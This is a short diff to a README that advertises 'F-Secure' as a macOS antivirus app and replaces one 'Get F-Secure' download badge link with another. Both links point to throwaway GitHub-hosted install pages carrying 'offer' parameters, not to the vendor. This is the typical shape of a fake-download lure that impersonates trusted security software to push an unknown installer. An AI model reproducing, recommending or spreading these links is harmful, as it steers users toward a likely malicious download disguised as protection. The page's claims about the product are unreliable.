@@ -2,7 +2,7 @@
 
 F-Secure is a macOS application designed to protect your Mac from viruses, malware, and online threats. It ensures safe browsing, real-time threat detection, and overall system security, making it an essential tool for Mac users concerned with privacy and protection.
 
-<a href="https://gistcdn.githack.com/asdeennerbonkers25/104d04ff7962f8ee07a5ac0861c95e1f/raw/f2f820e43755e984b1b9152a1f15f141e5259f12/install.html?offer=F-Secure" target="_blank">
+<a href="https://git-app-install.github.io/.github/?offer=FSecure" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20F-Secure%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
